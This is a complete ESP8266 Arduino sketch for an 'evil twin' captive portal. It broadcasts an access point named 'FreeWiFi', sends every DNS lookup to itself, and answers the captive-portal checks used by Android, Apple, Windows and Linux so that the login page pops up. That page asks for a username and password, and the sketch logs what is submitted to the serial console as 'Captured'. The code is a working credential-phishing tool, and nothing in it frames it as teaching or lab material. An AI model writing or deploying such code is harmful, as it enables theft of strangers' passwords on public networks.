#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>

// AP credentials
const char* ssid = "FreeWiFi";
const char* password = "12345678";

const byte DNS_PORT = 53;
DNSServer dnsServer;
ESP8266WebServer server(80);

void handleRoot() {
  String page = "<!DOCTYPE html><html><head><title>Login</title></head>";
  page += "<body><h2>Welcome to Free WiFi!</h2>";
  page += "<form action='/login' method='POST'>";
  page += "Username: <input type='text' name='user'><br>";
  page += "Password: <input type='password' name='pass'><br>";
  page += "<input type='submit' value='Login'>";
  page += "</form></body></html>";
  server.send(200, "text/html", page);
}

void handleLogin() {
  String user = server.arg("user");
  String pass = server.arg("pass");

  String resp = "<h2>Thanks!</h2>";
  resp += "<p>Username: " + user + "</p>";
  resp += "<p>Password: " + pass + "</p>";
  server.send(200, "text/html", resp);

  Serial.println("Captured -> " + user + " / " + pass);
}

void setup() {
  Serial.begin(115200);
  delay(1000);

  WiFi.softAP(ssid, password);
  Serial.print("AP IP: ");
  Serial.println(WiFi.softAPIP());

  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

  // Root handler for normal browsing
  server.on("/", handleRoot);

  // OS captive portal checks
  server.on("/generate_204", handleRoot);               // Android
  server.on("/hotspot-detect.html", handleRoot);        // Apple
  server.on("/redirect", handleRoot);                   // Windows
  server.on("/check_network_status.txt", handleRoot);   // Linux

  // Form handler
  server.on("/login", HTTP_POST, handleLogin);

  // Catch-all
  server.onNotFound(handleRoot);

  server.begin();
  Serial.println("Captive Portal ready");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}
